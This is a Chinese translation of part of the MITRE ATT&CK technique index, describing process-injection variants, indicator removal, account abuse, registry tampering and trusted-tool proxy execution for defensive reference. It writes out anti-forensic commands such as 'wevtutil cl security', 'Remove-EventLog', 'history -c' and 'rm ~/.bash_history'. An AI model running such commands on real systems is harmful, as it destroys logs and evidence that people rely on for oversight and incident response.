| [T1055.004](../techniques/T1055.004.md) | 异步过程调用 | 对手可能会通过异步过程调用（APC）队列将恶意代码注入进程，以规避基于进程的防御并可能提升权限。APC注入是一种在单独的活动进程的地址空间中执行任意代码的方法。  APC注入通常通过将恶意代码附加到进程线程的APC队列（引用: Microsoft APC）来执行。排队的APC函数在线程进入可变状态时执行。(引用: Microsoft APC) 首先使用本机Windows API调用（如<code>OpenThread</code>）创建现有受害进程的句柄。此时可以使用<code>QueueUserAPC</code>调用函数（如指向恶意DLL的<code>LoadLibrayA</code>）。  一种称为“早鸟注入”的APC注入变体涉及创建一个挂起的进程，在进程入口点（以及可能的后续反恶意软件钩子）之前通过APC写入和执行恶意代码。(引用: CyberBit Early Bird Apr 2018) AtomBombing (引用: ENSIL AtomBombing Oct 2016) 是另一种变体，利用APC调用先前写入全局原子表的恶意代码。(引用: Microsoft Atom Table)  在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过APC注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.005](../techniques/T1055.005.md) | 线程本地存储 | 攻击者可能通过线程本地存储（TLS）回调将恶意代码注入进程中，以规避基于进程的防御并可能提升权限。TLS回调注入是一种在独立活动进程的地址空间中执行任意代码的方法。  TLS回调注入涉及操纵可移植可执行文件（PE）内的指针，以在到达代码的合法入口点之前将进程重定向到恶意代码。TLS回调通常由操作系统用于设置和/或清理线程使用的数据。操纵TLS回调可能通过使用其他[进程注入](https://attack.mitre.org/techniques/T1055)技术（如[进程挖空](https://attack.mitre.org/techniques/T1055/012)）分配和写入进程内存空间中的特定偏移量来执行。(引用: FireEye TLS 2017年11月)  在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过TLS回调注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.008](../techniques/T1055.008.md) | Ptrace系统调用 | 攻击者可能通过ptrace（进程跟踪）系统调用将恶意代码注入进程，以规避基于进程的防御并可能提升权限。Ptrace系统调用注入是一种在独立活动进程的地址空间中执行任意代码的方法。  Ptrace系统调用注入涉及附加并修改正在运行的进程。Ptrace系统调用使调试进程能够观察和控制另一个进程（以及每个单独的线程），包括更改内存和寄存器值。(引用: PTRACE手册) Ptrace系统调用注入通常通过将任意代码写入正在运行的进程（例如<code>malloc</code>）然后使用<code>PTRACE_SETREGS</code>调用该内存来设置包含下一条指令的寄存器来执行。Ptrace系统调用注入也可以使用<code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>完成，这些操作将数据复制到目标进程内存中的特定地址（例如下一条指令的当前地址）。(引用: PTRACE手册)(引用: Medium Ptrace 2018年7月)  Ptrace系统调用注入可能无法针对非子进程和/或具有更高权限的进程。(引用: BH Linux注入)  在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过ptrace系统调用注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.009](../techniques/T1055.009.md) | 进程内存 | 对手可能会通过 /proc 文件系统将恶意代码注入进程中，以规避基于进程的防御，并可能提升权限。进程内存注入是一种在单独的活动进程地址空间中执行任意代码的方法。  进程内存注入涉及通过 /proc 文件系统 (<code>/proc/[pid]</code>) 枚举进程的内存，然后使用可用的小工具/指令制作返回导向编程 (ROP) 负载。每个运行的进程都有自己的目录，其中包括内存映射。进程内存注入通常通过使用 /proc 文件系统提供的内存映射覆盖目标进程的堆栈来执行。这些信息可用于枚举偏移量（包括堆栈）和小工具（或程序中可用于构建恶意负载的指令），这些偏移量和小工具通常被进程内存保护（如地址空间布局随机化 (ASLR)）隐藏。一旦枚举完毕，可以使用 dd 覆盖 <code>/proc/[pid]/maps</code> 中的目标进程内存映射。(引用: Uninformed Needle)(引用: GDS Linux Injection)(引用: DD Man)  其他技术（如 [动态链接器劫持](https://attack.mitre.org/techniques/T1574/006)）可用于填充目标进程以提供更多可用的小工具。类似于 [进程空洞化](https://attack.mitre.org/techniques/T1055/012)，进程内存注入可能会针对子进程（如后台的 sleep 副本）。(引用: GDS Linux Injection)  在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过进程内存注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.011](../techniques/T1055.011.md) | 额外窗口内存注入 | 对手可能通过额外窗口内存（EWM）注入恶意代码，以规避基于进程的防御措施并可能提升权限。EWM注入是一种在单独的活动进程的地址空间中执行任意代码的方法。  在创建窗口之前，基于图形的Windows进程必须遵循或注册一个窗口类，该类规定了外观和行为（通过窗口过程，这些过程是处理数据输入/输出的函数）。(引用: Microsoft Window Classes) 新窗口类的注册可以包括请求将最多40字节的EWM附加到该类每个实例的分配内存中。这个EWM旨在存储特定于该窗口的数据，并具有特定的应用程序编程接口（API）函数来设置和获取其值。(引用: Microsoft GetWindowLong function) (引用: Microsoft SetWindowLong function)  尽管很小，但EWM足够存储一个32位指针，通常用于指向一个窗口过程。恶意软件可能会利用这个内存位置作为攻击链的一部分，包括将代码写入进程内存的共享部分，将指针放置在EWM中，然后通过将执行控制返回到进程的EWM中的地址来调用执行。  通过EWM注入授予的执行可能允许访问目标进程的内存并可能提升权限。将有效负载写入共享部分还可以避免使用高度监控的API调用，如<code>WriteProcessMemory</code>和<code>CreateRemoteThread</code>。(引用: Elastic Process Injection July 2017) 更复杂的恶意软件样本还可能通过触发一系列窗口过程和其他系统函数，将恶意负载重写到目标进程的可执行部分，从而绕过数据执行保护（DEP）等保护机制。(引用: MalwareTech Power Loader Aug 2013) (引用: WeLiveSecurity Gapz and Redyms Mar 2013)  在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过EWM注入的执行还可以规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.012](../techniques/T1055.012.md) | 进程空洞化 | 对手可能会将恶意代码注入挂起和空洞化的进程中，以规避基于进程的防御。进程空洞化是一种在单独的活动进程地址空间中执行任意代码的方法。  进程空洞化通常通过在挂起状态下创建进程，然后取消映射/空洞化其内存来执行，随后可以用恶意代码替换。可以使用本机 Windows API 调用（如 <code>CreateProcess</code>）创建受害进程，其中包括一个标志以挂起进程的主线程。此时，可以使用 API 调用（如 <code>ZwUnmapViewOfSection</code> 或 <code>NtUnmapViewOfSection</code>）取消映射进程，然后通过 <code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code> 和 <code>ResumeThread</code> 分别写入、重新对齐到注入的代码并恢复。(引用: Leitch Hollowing)(引用: Elastic Process Injection July 2017)  这与[线程本地存储](https://attack.mitre.org/techniques/T1055/005)非常相似，但创建的是新进程，而不是针对现有进程。由于注入的进程是从（并因此继承了安全上下文）注入进程生成的，因此这种行为可能不会导致权限提升。然而，通过进程空洞化执行可能会规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.013](../techniques/T1055.013.md) | 进程双重映射 | 对手可能会通过进程双重映射将恶意代码注入进程，以规避基于进程的防御并可能提升权限。进程双重映射是一种在单独的活动进程的地址空间中执行任意代码的方法。  Windows Transactional NTFS (TxF) 在 Vista 中引入，作为执行安全文件操作的方法。(引用: Microsoft TxF) 为确保数据完整性，TxF 仅允许一个事务句柄在给定时间写入文件。在写入句柄事务终止之前，所有其他句柄都与写入者隔离，并且只能读取在打开句柄时存在的已提交版本的文件。(引用: Microsoft Basic TxF Concepts) 为避免损坏，如果系统或应用程序在写入事务期间失败，TxF 会自动回滚。(引用: Microsoft Where to use TxF)  尽管已弃用，但截至 Windows 10，TxF 应用程序编程接口 (API) 仍然启用。(引用: BlackHat Process Doppelgänging Dec 2017)  对手可能会滥用 TxF 执行无文件的[进程注入](https://attack.mitre.org/techniques/T1055)变体。类似于[进程空洞](https://attack.mitre.org/techniques/T1055/012)，进程双重映射涉及替换合法进程的内存，从而使恶意代码的隐蔽执行可能规避防御和检测。进程双重映射使用 TxF 还避免了使用高度监控的 API 函数，如<code>NtUnmapViewOfSection</code>、<code>VirtualProtectEx</code>和<code>SetThreadContext</code>。(引用: BlackHat Process Doppelgänging Dec 2017)  进程双重映射分为 4 个步骤(引用: BlackHat Process Doppelgänging Dec 2017)：  * 事务 – 使用合法可执行文件创建 TxF 事务，然后用恶意代码覆盖文件。这些更改将被隔离，并且仅在事务上下文中可见。 * 加载 – 创建共享内存段并加载恶意可执行文件。 * 回滚 – 撤销对原始可执行文件的更改，有效地从文件系统中删除恶意代码。 * 动画 – 从污染的内存段创建进程并启动执行。  由于注入的进程是从注入进程生成的（因此继承了注入进程的安全上下文），这种行为可能不会导致权限提升。然而，通过进程双重映射执行可能会规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.014](../techniques/T1055.014.md) | VDSO劫持 | 对手可能通过VDSO劫持将恶意代码注入进程，以规避基于进程的防御并可能提升权限。虚拟动态共享对象（vdso）劫持是一种在单独的活动进程地址空间中执行任意代码的方法。  VDSO劫持涉及重定向对动态链接共享库的调用。内存保护可能会阻止通过[Ptrace系统调用](https://attack.mitre.org/techniques/T1055/008)向进程写入可执行代码。然而，对手可能会劫持从vdso共享对象映射到进程的syscall接口代码存根，以执行syscall来打开和映射恶意共享对象。然后可以通过修补存储在进程全局偏移表中的内存地址引用来调用此代码（这些表存储映射库函数的绝对地址）。(引用: ELF Injection May 2009)(引用: Backtrace VDSO)(引用: VDSO Aug 2005)(引用: Syscall 2014)  在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过VDSO劫持执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.015](../techniques/T1055.015.md) | 列表植入 | 攻击者可能滥用列表视图控件将恶意代码注入到被劫持的进程中，以规避基于进程的防御并可能提升权限。列表植入是一种在独立活动进程的地址空间中执行任意代码的方法。(引用: Hexacorn列表植入) 通过列表植入执行的代码还可能规避安全产品的检测，因为执行被掩盖在合法进程下。  列表视图控件是用于显示项目集合的用户界面窗口。(引用: Microsoft列表视图控件) 有关应用程序列表视图设置的信息存储在进程内存中的<code>SysListView32</code>控件中。  列表植入（一种消息传递“碎片攻击”）可以通过将代码复制到使用列表视图控件的进程的虚拟地址空间，然后使用该代码作为自定义回调来对列出的项目进行排序来执行。(引用: Modexp Windows进程注入) 攻击者必须首先将代码复制到目标进程的内存空间中，这可以通过直接获取受害者进程窗口的<code>SysListView32</code>子句柄（通过Windows API调用，如<code>FindWindow</code>和/或<code>EnumWindows</code>）或其他[进程注入](https://attack.mitre.org/techniques/T1055)方法来完成。  某些列表植入的变体可能会在目标进程中分配内存，但随后使用窗口消息复制有效负载，以避免使用高度监控的<code>WriteProcessMemory</code>函数。例如，攻击者可以使用<code>PostMessage</code>和/或<code>SendMessage</code> API函数发送<code>LVM_SETITEMPOSITION</code>和<code>LVM_GETITEMPOSITION</code>消息，有效地将有效负载每次2字节复制到分配的内存中。(引用: ESET InvisiMole 2020年6月)  最后，通过向进程窗口的<code>SysListView32</code>子句发送<code>LVM_SORTITEMS</code>消息来触发有效负载，并将新分配的缓冲区中的有效负载作为<code>ListView_SortItems</code>回调传递并执行。 |
| [T1070](../techniques/T1070.md) | 指标移除 | 对手可能会删除或修改系统内生成的工件，以消除其存在的证据或阻碍防御。各种工件可能由对手创建或可以归因于对手的行为。通常，这些工件用作与监控事件相关的防御指标，例如从下载文件、用户操作生成的日志和防御者分析的其他数据。工件的位置、格式和类型（例如命令或登录历史记录）通常特定于每个平台。  删除这些指标可能会干扰事件收集、报告或用于检测入侵活动的其他过程。这可能会通过导致显著事件未报告来损害安全解决方案的完整性。由于缺乏足够的数据来确定发生了什么，这种活动还可能阻碍取证分析和事件响应。 |
| [T1070.001](../techniques/T1070.001.md) | 清除 Windows 事件日志 | 对手可能会清除 Windows 事件日志以隐藏入侵活动。Windows 事件日志是计算机警报和通知的记录。系统定义了三个事件源：系统、应用程序和安全性，具有五种事件类型：错误、警告、信息、成功审核和失败审核。   具有管理员权限，可以使用以下实用程序命令清除事件日志：  * <code>wevtutil cl system</code> * <code>wevtutil cl application</code> * <code>wevtutil cl security</code>  这些日志也可以通过其他机制清除，例如事件查看器 GUI 或 [PowerShell](https://attack.mitre.org/techniques/T1059/001)。例如，对手可能会使用 PowerShell 命令 <code>Remove-EventLog -LogName Security</code> 删除安全事件日志，并在重启后禁用未来的日志记录。注意：在运行命令和重启之间的时间内，事件可能仍会生成并记录在 .evtx 文件中。（引用：disable_win_evt_logging）  对手还可能尝试通过直接删除存储在 `C:\Windows\System32\winevt\logs\` 中的日志文件来清除日志。 |
| [T1070.002](../techniques/T1070.002.md) | 清除Linux或Mac系统日志 | 对手可能会清除系统日志以隐藏入侵的证据。macOS和Linux都通过系统日志跟踪系统或用户发起的操作。大多数本地系统日志记录存储在<code>/var/log/</code>目录下。此目录中的子文件夹按其相关功能分类日志，例如：(引用: Linux Logs)  * <code>/var/log/messages:</code>: 一般和系统相关消息 * <code>/var/log/secure</code>或<code>/var/log/auth.log</code>: 认证日志 * <code>/var/log/utmp</code>或<code>/var/log/wtmp</code>: 登录记录 * <code>/var/log/kern.log</code>: 内核日志 * <code>/var/log/cron.log</code>: Crond日志 * <code>/var/log/maillog</code>: 邮件服务器日志 * <code>/var/log/httpd/</code>: Web服务器访问和错误日志  |
| [T1070.003](../techniques/T1070.003.md) | 清除命令历史 | 除了清除系统日志外，对手可能会清除被破坏账户的命令历史，以隐藏入侵期间执行的操作。各种命令解释器会跟踪用户在终端中输入的命令，以便用户可以回溯他们所做的操作。  在Linux和macOS上，这些命令历史可以通过几种不同的方式访问。当用户登录时，这些命令历史会被记录在环境变量<code>HISTFILE</code>指向的文件中。当用户注销系统时，这些信息会被刷新到用户主目录中的一个名为<code>~/.bash_history</code>的文件中。这样做的好处是，它允许用户在不同的会话中回顾他们之前使用的命令。  对手可能会通过手动清除历史记录（<code>history -c</code>）或删除bash历史文件<code>rm ~/.bash_history</code>来删除他们的命令。  对手还可能利用网络设备上的[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)清除命令历史数据（<code>clear logging</code>和/或<code>clear history</code>）。(引用: US-CERT-TA18-106A)  在Windows主机上，PowerShell有两种不同的命令历史提供者：内置历史和由<code>PSReadLine</code>模块管理的命令历史。内置历史仅跟踪当前会话中使用的命令。这些命令历史对其他会话不可用，并且在会话结束时会被删除。  <code>PSReadLine</code>命令历史跟踪所有PowerShell会话中使用的命令，并将它们写入一个文件（默认情况下为<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>）。此历史文件对所有会话可用，并包含所有过去的历史记录，因为该文件在会话结束时不会被删除。(引用: Microsoft PowerShell Command History)  对手可能会运行PowerShell命令<code>Clear-History</code>以从当前PowerShell会话中清除整个命令历史。然而，这不会删除/清除<code>ConsoleHost_history.txt</code>文件。对手还可能删除<code>ConsoleHost_history.txt</code>文件或编辑其内容，以隐藏他们运行的PowerShell命令。(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics) |
| [T1070.004](../techniques/T1070.004.md) | 文件删除 | 对手可能会删除其入侵活动留下的文件。对手在系统上丢弃或创建的恶意软件、工具或其他非本机文件（例如，[入口工具传输](https://attack.mitre.org/techniques/T1105)）可能会留下痕迹，表明在网络中进行了什么操作以及如何进行。文件删除可以在入侵期间发生，也可以作为入侵后过程的一部分，以最小化对手的痕迹。  可以使用主机操作系统提供的工具进行清理，但对手也可能使用其他工具。(引用: Microsoft SDelete July 2016) 内置的 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059) 功能的示例包括 Windows 上的 <code>del</code> 和 Linux 及 macOS 上的 <code>rm</code> 或 <code>unlink</code>。 |
| [T1070.005](../techniques/T1070.005.md) | 删除网络共享连接 | 对手可能会删除不再有用的共享连接，以清理其操作痕迹。Windows共享驱动器和[SMB/Windows管理员共享](https://attack.mitre.org/techniques/T1021/002)连接可以在不再需要时删除。[Net](https://attack.mitre.org/software/S0039)是一个可以使用<code>net use \\system\share /delete</code>命令删除网络共享连接的实用程序。(引用: Technet Net Use) |
| [T1070.006](../techniques/T1070.006.md) | 时间戳篡改 | 对手可能会修改文件时间属性以隐藏新文件或对现有文件的更改。时间戳篡改是一种修改文件时间戳（修改、访问、创建和更改时间）的技术，通常是为了模仿同一文件夹中的文件并将恶意文件与合法文件混合。  主文件表 (MFT) 文件中的 `$STANDARD_INFORMATION` (`$SI`) 和 `$FILE_NAME` (`$FN`) 属性都记录时间。(引用: Inversecos Timestomping 2022) `$SI`（日期/时间戳）显示给最终用户，包括在文件系统视图中，而 `$FN` 由内核处理。(引用: Magnet Forensics)  修改 `$SI` 属性是最常见的时间戳篡改方法，因为它可以通过 API 调用在用户级别进行修改。然而，`$FN` 时间戳篡改通常需要与系统内核交互或移动或重命名文件。(引用: Inversecos Timestomping 2022)  对手修改文件上的时间戳，以便它们在法医调查员或文件分析工具中不显得显眼。为了规避依赖于识别 `$SI` 和 `$FN` 属性之间差异的检测，对手还可能进行“双重时间戳篡改”，同时修改两个属性上的时间。(引用: Double Timestomping)  时间戳篡改可能与文件名[伪装](https://attack.mitre.org/techniques/T1036)一起使用，以隐藏恶意软件和工具。(引用: WindowsIR Anti-Forensic Techniques) |
| [T1070.007](../techniques/T1070.007.md) | 清除网络连接历史和配置 | 对手可能会清除或删除恶意网络连接的证据，以清理其操作的痕迹。需要网络连接的行为（例如 [远程服务](https://attack.mitre.org/techniques/T1021) 或 [外部远程服务](https://attack.mitre.org/techniques/T1133)）可能会在系统和/或应用程序日志中创建配置设置以及突出连接历史的各种工件。防御者可以使用这些工件来监控或分析对手创建的网络连接。  网络连接历史可能存储在各种位置。例如，RDP 连接历史可能存储在 Windows 注册表值中 (引用: Microsoft RDP Removal):  * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>  Windows 还可能在 <code>C:\Users\\%username%\Documents\Default.rdp</code> 和 `C:\Users\%username%\AppData\Local\Microsoft\Terminal Server Client\Cache\` 文件中存储有关最近 RDP 连接的信息。(引用: Moran RDPieces) 类似地，macOS 和 Linux 主机可能会在系统日志中存储突出连接历史的信息（例如存储在 `/Library/Logs` 和/或 `/var/log/` 中的日志）。(引用: Apple Culprit Access)(引用: FreeDesktop Journal)(引用: Apple Unified Log Analysis Remote Login and Screen Sharing)  恶意网络连接还可能需要更改第三方应用程序或网络配置设置，例如 [禁用或修改系统防火墙](https://attack.mitre.org/techniques/T1562/004) 或篡改以启用 [代理](https://attack.mitre.org/techniques/T1090)。对手可能会删除或修改这些数据以隐藏指标和/或阻碍防御分析。 |
| [T1070.008](../techniques/T1070.008.md) | 清除邮箱数据 | 对手可能会修改邮件和邮件应用程序数据，以删除其活动的证据。电子邮件应用程序允许用户和其他程序通过命令行工具或使用API导出和删除邮箱数据。邮件应用程序数据可以是电子邮件、电子邮件元数据或由应用程序或操作系统生成的日志，例如导出请求。  对手可能会操纵电子邮件和邮箱数据，以删除日志、工件和元数据，例如[网络钓鱼](https://attack.mitre.org/techniques/T1566)/[内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)、[电子邮件收集](https://attack.mitre.org/techniques/T1114)、用于命令和控制的[邮件协议](https://attack.mitre.org/techniques/T1071/003)或基于电子邮件的外传（例如[通过替代协议外传](https://attack.mitre.org/techniques/T1048)）。例如，为了删除Exchange服务器上的证据，对手使用了<code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)模块，包括<code>Remove-MailboxExportRequest</code>以删除邮箱导出的证据。(引用: Volexity SolarWinds)(引用: ExchangePowerShell Module) 在Linux和macOS上，对手还可能通过名为<code>mail</code>的命令行实用程序删除电子邮件，或使用[AppleScript](https://attack.mitre.org/techniques/T1059/002)与macOS上的API交互。(引用: Cybereason Cobalt Kitty 2017)(引用: mailx man page)  对手还可能删除电子邮件和指示垃圾邮件或可疑活动的元数据/标头（例如，通过使用组织范围的传输规则），以减少恶意电子邮件被安全产品检测到的可能性。(引用: Microsoft OAuth Spam 2022) |
| [T1070.009](../techniques/T1070.009.md) | 清除持久性 | 对手可能会清除与先前在主机系统上建立的持久性相关的工件，以删除其活动的证据。这可能涉及各种操作，例如删除服务、删除可执行文件、[修改注册表](https://attack.mitre.org/techniques/T1112)、[Plist 文件修改](https://attack.mitre.org/techniques/T1647) 或其他清理方法，以防止防御者收集其持久存在的证据。(引用: Cylance Dust Storm) 对手还可能删除先前创建的账户以保持持久性（即 [创建账户](https://attack.mitre.org/techniques/T1136)）。(引用: Talos - Cisco Attack 2022)  在某些情况下，持久性的工件可能会在对手的持久性执行后被删除，以防止新实例的恶意软件出现错误。(引用: NCC Group Team9 June 2020) |
| [T1070.010](../techniques/T1070.010.md) | 重新定位恶意软件 | 一旦有效载荷被交付，对手可能会在受害者系统上复制相同恶意软件的副本，以删除其存在的证据和/或避免防御。将恶意软件有效载荷复制到新位置也可以与[文件删除](https://attack.mitre.org/techniques/T1070/004)结合使用，以清理旧的工件。  重新定位恶意软件可能是许多旨在规避防御的操作的一部分。例如，对手可能会复制并重命名有效载荷，以更好地融入本地环境（即[匹配合法名称或位置](https://attack.mitre.org/techniques/T1036/005)）。(引用: DFIR Report Trickbot June 2023) 有效载荷还可以重新定位到目标[文件/路径排除](https://attack.mitre.org/techniques/T1564/012)以及与建立[持久性](https://attack.mitre.org/tactics/TA0003)相关的特定位置。(引用: Latrodectus APR 2024)  重新定位恶意有效载荷还可能阻碍防御分析，特别是将这些有效载荷与早期事件（如[用户执行](https://attack.mitre.org/techniques/T1204)和[网络钓鱼](https://attack.mitre.org/techniques/T1566)）分开，这些事件可能已生成警报或以其他方式引起防御者的注意。 |
| [T1078](../techniques/T1078.md) | 有效账户 | 对手可能会获取和滥用现有账户的凭据，作为获得初始访问、持久性、权限提升或规避防御的一种手段。被破坏的凭据可能用于绕过系统内各种资源上的访问控制，甚至可能用于对远程系统和外部可用服务（如 VPN、Outlook Web Access、网络设备和远程桌面）的持久访问。(引用: volexity_0day_sophos_FW) 被破坏的凭据还可能授予对手对特定系统的更高权限或对网络中受限区域的访问权限。对手可能选择不使用恶意软件或工具，而是利用这些凭据提供的合法访问权限，使其存在更难被检测到。  在某些情况下，对手可能会滥用不活跃的账户：例如，那些属于不再是组织成员的个人的账户。使用这些账户可能使对手能够规避检测，因为原账户用户不会在场，无法识别其账户上发生的任何异常活动。(引用: CISA MFA PrintNightmare)  由于本地、域和云账户在系统网络中的权限重叠，对手可能能够跨账户和系统进行横向移动，以达到高水平的访问（即域或企业管理员），从而绕过企业内部设置的访问控制。(引用: TechNet Credential Theft) |
| [T1078.001](../techniques/T1078.001.md) | 默认帐户 | 对手可能会获取和滥用默认帐户的凭据，作为获得初始访问、持久性、权限提升或防御规避的一种手段。默认帐户是内置于操作系统中的帐户，例如 Windows 系统上的来宾或管理员帐户。默认帐户还包括其他类型系统、软件或设备上的默认工厂/提供商设置帐户，包括 AWS 中的 root 用户帐户和 Kubernetes 中的默认服务帐户。（引用：Microsoft 本地帐户 2019 年 2 月）（引用：AWS Root 用户）（引用：Kubernetes 威胁矩阵）  默认帐户不仅限于客户端机器，还包括为设备（如网络设备和计算机应用程序）预设的帐户，无论它们是内部的、开源的还是商业的。安装后未更改的预设用户名和密码组合的设备对组织构成严重威胁，因为它们是对手的容易目标。同样，对手还可能利用公开披露或被盗的 [私钥](https://attack.mitre.org/techniques/T1552/004) 或凭据材料，通过 [远程服务](https://attack.mitre.org/techniques/T1021) 合法连接到远程环境。（引用：Metasploit SSH 模块） |
| [T1078.002](../techniques/T1078.002.md) | 域账户 | 对手可能会获取和滥用域账户的凭据，作为获得初始访问、持久性、权限提升或规避防御的一种手段。(引用: TechNet Credential Theft) 域账户是由Active Directory域服务管理的账户，访问和权限配置在属于该域的系统和服务中。域账户可以覆盖用户、管理员和服务。(引用: Microsoft AD Accounts)  对手可能通过各种手段（如[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)或密码重用）来妥协域账户，其中一些具有高权限，从而访问域的特权资源。 |
| [T1078.003](../techniques/T1078.003.md) | 本地账户 | 对手可能获取和滥用本地账户的凭据，作为获得初始访问、持久性、权限提升或规避防御的手段。本地账户是组织为用户、远程支持、服务或单个系统或服务的管理配置的账户。  本地账户也可能被滥用以提升权限并通过[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)收集凭据。密码重用可能允许在网络上的一组机器上滥用本地账户，以实现权限提升和横向移动。 |
| [T1112](../techniques/T1112.md) | 修改注册表 | 对手可能会与Windows注册表交互，以在注册表项中隐藏配置信息，删除信息作为清理的一部分，或作为其他技术的一部分以帮助持久性和执行。  访问注册表的特定区域取决于帐户权限，有些需要管理员级别的访问权限。内置的Windows命令行实用程序[Reg](https://attack.mitre.org/software/S0075)可用于本地或远程注册表修改。(引用: Microsoft Reg) 其他工具也可以使用，例如远程访问工具，它可能包含通过Windows API与注册表交互的功能。  注册表修改还可能包括隐藏键的操作，例如在键名之前添加一个空字符，这将在通过[Reg](https://attack.mitre.org/software/S0075)或其他使用Win32 API的实用程序读取时导致错误和/或被忽略。(引用: Microsoft Reghide NOV 2006) 对手可能会滥用这些伪隐藏键来隐藏用于保持持久性的有效负载/命令。(引用: TrendMicro POWELIKS AUG 2014) (引用: SpectorOps Hiding Reg Jul 2017)  远程系统的注册表可能会被修改以帮助执行文件作为横向移动的一部分。这需要目标系统上运行远程注册表服务。(引用: Microsoft Remote) 通常需要[有效帐户](https://attack.mitre.org/techniques/T1078)，以及访问远程系统的[SMB/Windows管理员共享](https://attack.mitre.org/techniques/T1021/002)以进行RPC通信。 |
| [T1127](../techniques/T1127.md) | 受信任的开发者工具代理执行 | 对手可能利用受信任的开发者工具代理执行恶意负载。有许多用于软件开发相关任务的工具可以用来以各种形式执行代码，以协助开发、调试和逆向工程。(引用: engima0x3 DNX Bypass)(引用: engima0x3 RCSI Bypass)(引用: Exploit Monday WinDbg)(引用: LOLBAS Tracker) 这些工具可能经常使用合法证书签名，允许它们在系统上执行，并通过受信任的进程代理执行恶意代码，从而有效地绕过应用程序控制解决方案。 |
| [T1127.001](../techniques/T1127.001.md) | MSBuild | 对手可能会使用 MSBuild 通过受信任的 Windows 实用程序代理执行代码。MSBuild.exe（Microsoft 构建引擎）是 Visual Studio 使用的软件构建平台。它处理 XML 格式的项目文件，这些文件定义了加载和构建各种平台和配置的要求。(引用: MSDN MSBuild)  对手可以滥用 MSBuild 代理执行恶意代码。MSBuild 引入的内联任务功能允许将 C# 或 Visual Basic 代码插入到 XML 项目文件中。(引用: MSDN MSBuild)(引用: Microsoft MSBuild Inline Tasks 2017) MSBuild 将编译并执行内联任务。MSBuild.exe 是一个签名的 Microsoft 二进制文件，因此当以这种方式使用时，它可以执行任意代码并绕过配置为允许 MSBuild.exe 执行的应用程序控制防御。(引用: LOLBAS Msbuild) |
| [T1127.002](../techniques/T1127.002.md) | ClickOnce | 对手可能会使用ClickOnce应用程序（.appref-ms和.application文件）通过受信任的Windows实用程序代理执行代码。(引用: Burke/CISA ClickOnce BlackHat) ClickOnce是一种部署方式，使用户能够创建自更新的基于Windows的.NET应用程序（即.XBAP、.EXE或.DLL），这些应用程序从文件共享或网页安装和运行，用户交互最少。应用程序作为DFSVC.EXE的子进程启动，DFSVC.EXE负责安装、启动和更新应用程序。(引用: SpectorOps Medium ClickOnce)  由于ClickOnce应用程序仅获得有限的权限，因此它们不需要管理员权限即可安装。(引用: Microsoft Learn ClickOnce) 因此，对手可能会滥用ClickOnce来代理执行恶意代码，而无需提升权限。  ClickOnce可能会以多种方式被滥用。例如，对手可能依赖[用户执行](https://attack.mitre.org/techniques/T1204)。当用户访问恶意网站时，.NET恶意软件伪装成合法软件，并显示ClickOnce弹出窗口以进行安装。(引用: NetSPI ClickOnce)  对手还可能滥用ClickOnce通过[Rundll32](https://attack.mitre.org/techniques/T1218/011)脚本执行恶意软件，使用命令`rundll32.exe dfshim.dll,ShOpenVerbApplication1`。(引用: LOLBAS /Dfsvc.exe)  此外，对手可以将ClickOnce应用程序文件移动到远程用户的启动文件夹，以继续部署恶意代码（即[注册表运行键/启动文件夹](https://attack.mitre.org/techniques/T1547/001)）。(引用: Burke/CISA ClickOnce BlackHat)(引用: Burke/CISA ClickOnce Paper) |
| [T1134](../techniques/T1134.md) | 访问令牌操纵 | 对手可能会修改访问令牌以在不同用户或系统安全上下文下操作以执行操作并绕过访问控制。Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌，使正在运行的进程看起来像是属于不同进程的子进程或属于启动进程的用户以外的其他人。当发生这种情况时，进程还会采用与新令牌关联的安全上下文。  对手可以使用内置的Windows API函数从现有进程中复制访问令牌；这称为令牌窃取。这些令牌可以应用于现有进程（即[令牌冒充/窃取](https://attack.mitre.org/techniques/T1134/001)）或用于生成新进程（即[使用令牌创建进程](https://attack.mitre.org/techniques/T1134/002)）。对手必须已经处于特权用户上下文（即管理员）才能窃取令牌。然而，对手通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果账户在远程系统上具有适当权限，对手可以使用令牌作为该账户进行身份验证。(引用: Pentestlab Token Manipulation)  任何标准用户都可以使用<code>runas</code>命令和Windows API函数创建冒充令牌；这不需要访问管理员账户。还有其他机制，如Active Directory字段，可以用来修改访问令牌。 |
